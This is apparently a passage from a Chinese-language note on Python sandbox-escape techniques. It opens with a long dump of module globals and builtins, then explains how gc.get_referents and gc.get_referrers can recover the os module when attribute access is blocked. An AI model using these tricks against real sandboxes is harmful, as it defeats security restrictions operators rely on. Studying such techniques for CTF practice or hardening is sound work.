https://www.python.org/psf/license/, 'help': Type help() for interactive help, or help(object) for help about object.}, 'base_backend': <module 'sympy.plotting.backends.base_backend' from '/usr/local/lib/python3.9/site-packages/sympy/plotting/backends/base_backend.py'>, 'LineOver1DRangeSeries': <class 'sympy.plotting.series.LineOver1DRangeSeries'>, 'textplot': <function textplot at 0x7f6a9dc64a60>, 'TextBackend': <class 'sympy.plotting.backends.textbackend.text.TextBackend'>}, (None,), ('super', '__init__'), ('self', 'args', 'kwargs'), ('__class__',), (None, 1, 'The TextBackend supports only one graph per Plot.', 0, 'The TextBackend supports only expressions over a 1D range'), ('base_backend', '_show', 'len', '_series', 'ValueError', 'isinstance', 'LineOver1DRangeSeries', 'textplot', 'expr', 'start', 'end'), ('self', 'ser'), ('self',), <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, ModuleSpec(name='sympy.plotting.textplot', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py'), {'name': 'sympy.plotting.textplot', 'loader': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, 'origin': '/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py', 'loader_state': None, 'submodule_search_locations': None, '_set_fileattr': True, '_cached': '/usr/local/lib/python3.9/site-packages/sympy/plotting/__pycache__/textplot.cpython-39.pyc', '_initializing': False}, <module 'sympy.plotting.textplot' from '/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py'>, {'__name__': 'sympy.plotting.textplot', '__doc__': None, '__package__': 'sympy.plotting', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, '__spec__': ModuleSpec(name='sympy.plotting.textplot', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f6a9dc61820>, origin='/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py'), '__file__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py', '__cached__': '/usr/local/lib/python3.9/site-packages/sympy/plotting/__pycache__/textplot.cpython-39.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <function ascii at 0x7f6ab85e2ee0>, 'bin': <function bin at 0x7f6ab85e2f70>, 'breakpoint': <function breakpoint at 0x7f6ab85e8040>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <function delattr at 0x7f6ab85e80d0>, 'dir': <function dir at 0x7f6ab85e8160>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <function format at 0x7f6ab85e81f0>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <function hex at 0x7f6ab85e8280>, 'id': <built-in function id>, 'input': <function input at 0x7f6ab85e83a0>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <function oct at 0x7f6ab85e8430>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <function hook_setattr.<locals>.builtin_setattr_with_checkcode at 0x7f6ab8a58e50>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <function open at 0x7f6ab85e8550>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation.\nAll Rights Reserved.\n\nCopyright (c) 2000 BeOpen.com.\nAll Rights Reserved.\n\nCopyright (c) 1995-2001 Corporation for National Research Initiatives.\nAll Rights Reserved.\n\nCopyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.\nAll Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands\n    for supporting Python development.  See www.python.org for more information., 'license': See https://www.python.org/psf/license/, 'help': Type help() for interactive help, or help(object) for help about object.}, 'Float': <class 'sympy.core.numbers.Float'>, 'Dummy': <class 'sympy.core.symbol.Dummy'>, 'lambdify': <function lambdify at 0x7f6ab8bd81f0>, 'math': <module 'math' from '/usr/lib64/python3.9/lib-dynload/math.cpython-39-x86_64-linux-gnu.so'>, 'is_valid': <function is_valid at 0x7f6a9dc641f0>, 'rescale': <function rescale at 0x7f6a9dc64820>, 'linspace': <function linspace at 0x7f6a9dc64940>, 'textplot_str': <function textplot_str at 0x7f6a9dc649d0>, 'textplot': <function textplot at 0x7f6a9dc64a60>}, ('Check if a floating point number is valid', None, False), ('isinstance', 'complex', 'math', 'isinf', 'isnan'), ('x',), ('Rescale the given array `y` to fit into the integer values\\n    between `0` and `H-1` for the values between ``mi`` and ``ma``.\\n    ', 2, None, 1), ('range', 'is_valid', 'append', 'Float', 'round', 'int'), ('y', 'W', 'H', 'mi', 'ma', 'y_new', 'norm', 'offset', 'x', 'normalized', 'rescaled'), (None, <code object <listcomp> at 0x7f6a9dc6a0e0, file \"/usr/local/lib/python3.9/site-packages/sympy/plotting/textplot.py\", line 41>, 'linspace.<locals>.<listcomp>'), (1,)]\n"
```

##### gc.get_referents

返回传入对象直接引用的所有对象的列表。（我引用了谁）

比如.不能使用时可以获取一些东西。

```python
from gc import get_referents
import cgi
print((get_referents(cgi)[0]['os']))
```

##### gc.get_referrers

返回所有直接引用传入对象的对象列表。（谁引用了我）

比如通过None就能找到非常多的类和方法，里面很容易就可以找到os等危险模块。

```python
import gc
print(gc.get_referrers(None))
```





